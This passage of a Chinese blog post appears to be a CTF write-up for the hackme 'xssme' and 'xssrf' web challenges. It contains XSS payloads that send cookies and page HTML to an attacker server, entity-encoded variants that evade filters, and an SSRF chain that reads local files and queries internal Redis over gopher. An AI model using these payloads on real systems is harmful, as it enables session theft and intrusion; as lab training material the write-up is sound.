<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;javascript:document.location=&apos;//vps_ip:9999?cookie=&apos;+document.cookie&quot;&gt;</span><br><span class="line"></span><br><span class="line">或者将 &quot;&quot; 内的内容 HTML 实体编码下</span><br><span class="line">&lt;svg/onload=&quot;javascript:document.location.href=(&apos;//vps_ip:9999?cookie=&apos;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">如果没发现上面一些过滤是包含空格一起检测的，将失去大量合适 payload</span><br><span class="line">&lt;img src=&quot;&quot;onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>使用 xss 平台接收一下请求，或者直接用 nc 监听。</p>
<p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w107xescj20ml04sjrq.jpg" alt></p>
<h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf leak</a></h2><blockquote>
<p>Steal flag from source code file</p>
</blockquote>
<p>提示是 flag 在源码里面，那我们先读一下页面的源代码看看。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;javascript:document.location=&apos;//vps_ip:9999?cookie=&apos;+btoa(document.body.innerHTML)&quot;&gt;</span><br><span class="line"></span><br><span class="line">发现 innerHTML 被过滤，那就 HTML 编码一下</span><br><span class="line">&lt;svg/onload=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2e;&amp;#x32;&amp;#x32;&amp;#x30;&amp;#x2e;&amp;#x32;&amp;#x34;&amp;#x31;&amp;#x3a;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x3f;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3d;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>拿到 HTML，有点残缺，自己改下标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-lg navbar-dark bg-dark d-flex"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>XSSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;a class=" nav-link" href="sendmail.php"&gt;Send Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="mailbox.php"&gt;Mailbox&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="sentmail.php"&gt;Sent Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="setadmin.php"&gt;Set Admin&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">" nav-link"</span> <span class="attr">href</span>=<span class="string">"request.php"</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            &lt;/bGk &lt;/ul&gt; &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;span class=" navbar-texdCI Hello, admin (Administrator)&lt;/span&gt; &lt;/bGk &lt;li class="nav-item"&gt;</span><br><span class="line">            &lt;a class="nav-link" href="logout.php"&gt;Logout&lt;L2E &lt;/li&gt; &lt;/dWw &lt;/nav&gt; &lt;div class="containeciI </span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">" card text-white bg-darayI &lt;div class="</span><span class="attr">card-body</span>"&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"card-titlZSI </span></span></span><br><span class="line"><span class="tag"><span class="string">            4          &lt;/h2&gt;</span></span></span><br><span class="line">          &lt;h4&gt;From: &lt;a href=" sendmail.php?to=jj"&gt;jj&lt;/a&gt;&lt;/aDQ &lt;div class="card-text"&gt;&lt;svg onload="javascript:document.location='http://vps_ip:9999?cookie='+btoa(document.body.innerHTMLKSI &lt;/sdmc &lt;/daXY </span><br><span class="line">        <span class="tag">&lt;/<span class="name">daXY</span> </span></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">daXY</span></span></span><br></pre></td></tr></table></figure>

<p>发现有个 <code>request.php</code> ，无法直接访问，需要 <code>admin</code>。</p>
<p>想办法让真正的 <code>admin</code> 去访问一下，然后把相应的结果返回给我们。</p>
<p>既然都可以执行 <code>js</code> 代码了，那直接构造一个 <code>Ajax</code> 请求，这里用的是原生的 <code>Ajax</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='//vps_ip:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">GET</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>();</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到 <code>request.php</code> 访问接口</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">"/request.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;textarea name=<span class="string">"url"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>有用的只有这一部分，传的参数是<code>url</code>，有没可能是文件包含呢？用 <code>file://</code> 协议试试。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">var x=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="tag"><span class="string">x.onreadystatechange=function() &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">    if (x.readyState==4 &amp;&amp; x.status==200) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">        document.location='//vps_ip:9999/?code='+btoa(x.responseText);</span></span></span><br><span class="line"><span class="tag"><span class="string">    &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">x.open("</span><span class="attr">POST</span>","<span class="attr">request.php</span>",<span class="attr">true</span>);</span></span><br><span class="line"><span class="tag"><span class="attr">x.setRequestHeader</span>("<span class="attr">Content-type</span>","<span class="attr">application</span>/<span class="attr">x-www-form-urlencoded</span>");</span></span><br><span class="line"><span class="tag"><span class="attr">x.send</span>("<span class="attr">url</span>=<span class="string">file:///var/www/html/config.php</span>");</span></span><br><span class="line"><span class="tag">"&gt;</span></span><br></pre></td></tr></table></figure>

<p>成功拿到 <code>flag</code>，并提示我们下一个 <code>flag</code> 在 Redis 里。</p>
<h2 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf redis</a></h2><blockquote>
<p>Steal flag from redis</p>
</blockquote>
<p>有了上一题的 <code>ssrf</code> ，打内网 redis 也是水到渠成了。</p>
<p>先看一下之前的 <code>request.php</code> 源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span>(<span class="string">'common.php'</span>); </span><br><span class="line">admin_required(); </span><br><span class="line">$msg = []; </span><br><span class="line">$url = <span class="string">''</span>; </span><br><span class="line">$result = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $result = shell_exec(<span class="string">'curl -m 1 --connect-timeout 1 -s '</span> . escapeshellarg($url)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造 payload 打下 Redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:25566/_info</span><br><span class="line"></span><br><span class="line">将之前发送的数据改下即可。</span><br><span class="line">x.send(&quot;url=gopher://127.0.0.1:25566/_info&quot;);</span><br></pre></td></tr></table></figure>

<p>成功打到回显，看来就是未授权打 redis 了，其他的就是老套路了，具体利用方式见 <a href="[https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/](https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/)">博客</a>。</p>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
            </p><p>原文链接：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">https://wywwzjj.top/2019/02/02/Hackme-Writeup/</a>
            </p><p>发表日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">February 2nd 2019, 11:23:33 pm</a>
            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">March 22nd 2020, 6:11:48 pm</a>
            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2019/02/25/Jarvis-OJ-phpinfo/" title="Jarvis OJ phpinfo">
                    <div class="nextTitle">Jarvis OJ phpinfo</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2019/02/02/Jarvis-OJ-Writeup/" title="Jarvis OJ Writeup">
                    <div class="prevTitle">Jarvis OJ Writeup</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
            
                <a href="//twitter.com/wywwzjj" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
            
        
    
        
            
                <span class="iconfont-archer qq" title="qq">
                  
                  <img class="profile-qr" src="/assets/QQ.png">
                </span>
            
        
    
        
    
        
            
                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
            
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
        
        
        <span id="busuanzi_container_site_pv" class="theme-info">
            |&nbsp;&nbsp;总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;&nbsp;次
        </span>
        <span id="busuanzi_container_site_uv" class="theme-info">
            &nbsp;&nbsp;|&nbsp;&nbsp;访客数&nbsp;<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;人次&nbsp;&nbsp;|
        </span>
        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
        
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">1.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#guestbook"><span class="toc-number">2.</span> <span class="toc-text">guestbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI"><span class="toc-number">3.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#homepage"><span class="toc-number">4.</span> <span class="toc-text">homepage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">5.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#scoreboard"><span class="toc-number">6.</span> <span class="toc-text">scoreboard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-0"><span class="toc-number">7.</span> <span class="toc-text">login as admin 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-0-1"><span class="toc-number">8.</span> <span class="toc-text">login as admin 0.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-1"><span class="toc-number">9.</span> <span class="toc-text">login as admin 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-1-2"><span class="toc-number">10.</span> <span class="toc-text">login as admin 1.2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-3"><span class="toc-number">11.</span> <span class="toc-text">login as admin 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-4"><span class="toc-number">12.</span> <span class="toc-text">login as admin 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-6"><span class="toc-number">13.</span> <span class="toc-text">login as admin 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-7"><span class="toc-number">14.</span> <span class="toc-text">login as admin 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-8"><span class="toc-number">15.</span> <span class="toc-text">login as admin 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login-as-admin-8-1"><span class="toc-number">16.</span> <span class="toc-text">login as admin 8.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dafuq-manager-1"><span class="toc-number">17.</span> <span class="toc-text">dafuq-manager 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dafuq-manager-2"><span class="toc-number">18.</span> <span class="toc-text">dafuq-manager 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dafuq-manager-3"><span class="toc-number">19.</span> <span class="toc-text">dafuq-manager 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">20.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#command-executor"><span class="toc-number">21.</span> <span class="toc-text">command-executor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xssme"><span class="toc-number">22.</span> <span class="toc-text">xssme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xssrf-leak"><span class="toc-number">23.</span> <span class="toc-text">xssrf leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xssrf-redis"><span class="toc-number">24.</span> <span class="toc-text">xssrf redis</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 58
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/22</span><a class="archive-post-title" href="/2020/03/22/LeetCode-Weekly-Contest-181/">LeetCode Weekly Contest 181</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/22</span><a class="archive-post-title" href="/2020/03/22/LeetCode-Weekly-Contest-22/">LeetCode Weekly Contest 22（双周赛）</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/2020/03/21/LeetCode-数据库专题/">LeetCode 数据库专题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2020/03/08/LeetCode-Weekly-Contest-179/">LeetCode Weekly Contest 179</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2020/03/08/LeetCode-Weekly-Contest-21/">LeetCode Weekly Contest 21（双周赛）</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/LeetCode-Weekly-Contest-177/">LeetCode Weekly Contest 177</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2020/01/30/ThinkPHP-3-X-5-X-order-by-注入/">ThinkPHP 3.X / 5.X order by 注入</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2020/01/24/Go-学习/">Go 学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/23</span><a class="archive-post-title" href="/2020/01/23/PHP-FPM-RCE/">PHP-FPM RCE (CVE-2019-11043)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/17</span><a class="archive-post-title" href="/2020/01/17/ThinkPHP-6.0-任意文件写入/">ThinkPHP 6.0 任意文件写入</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2019/12/16/CSAPP-Chapter-12-Notes/">CSAPP 并发编程 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/2019/12/15/smarty-3.1.31-RCE/">smarty 3.1.31 RCE（CVE-2017-1000480）</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/2019/12/02/CSAPP-Chapter-11-Notes/">CSAPP 网络编程 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/2019/11/25/CSAPP-Chapter-10-Notes/">CSAPP 系统级 IO 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/21</span><a class="archive-post-title" href="/2019/11/21/ThinkCMF-前台模板注入-RCE/">ThinkCMF 前台模板注入 RCE</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/CSAPP-Chapter-9-Notes/">CSAPP 虚拟存储器 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/CSAPP-Chapter-8-Notes/">CSAPP 异常控制流 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/24</span><a class="archive-post-title" href="/2019/10/24/Python-pickle-反序列化实例分析/">Python pickle 反序列化实例分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/21</span><a class="archive-post-title" href="/2019/10/21/CSAPP-Chapter-6-Notes/">CSAPP 存储器层次结构 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/10</span><a class="archive-post-title" href="/2019/10/10/CSAPP-Chapter-3-Notes/">CSAPP 程序的机器级表示 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/06</span><a class="archive-post-title" href="/2019/10/06/BalsnCTF-2019-web题/">Balsn CTF 2019 web 题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/2019/09/08/CSAPP-Chapter-2-Notes/">CSAPP 信息的表示和处理 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2019/09/01/CSAPP-Chapter-1-Notes/">CSAPP 计算机系统漫游 笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/20</span><a class="archive-post-title" href="/2019/08/20/当PHP反序列化遇上SSRF/">当 PHP 反序列化遇上 SSRF</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/Discuz-ML!-V3.X-RCE/">Discuz ML! V3.X RCE</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/11</span><a class="archive-post-title" href="/2019/07/11/PHP-写入配置文件经典问题/">PHP 写配置文件经典问题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化学习/">phar 与反序列化学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入总结/">命令注入总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/">vulnhub 靶机实战系列 HackInOS</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/Leetcode-322-Coin-Change/">Leetcode 322.Coin Change[DP]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/无字母数字-webshell/">无字母数字 webshell</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/PHP-SECURITY-CALENDAR-2017/">PHP SECURITY CALENDAR Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/sqlmap-tamper-列表/">sqlmap tamper 列表</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis-OJ-inject/">Jarvis OJ inject</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis-OJ-phpinfo/">Jarvis OJ phpinfo</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Hackme-Writeup/">Hackme-Web-Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Jarvis-OJ-Writeup/">Jarvis OJ Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
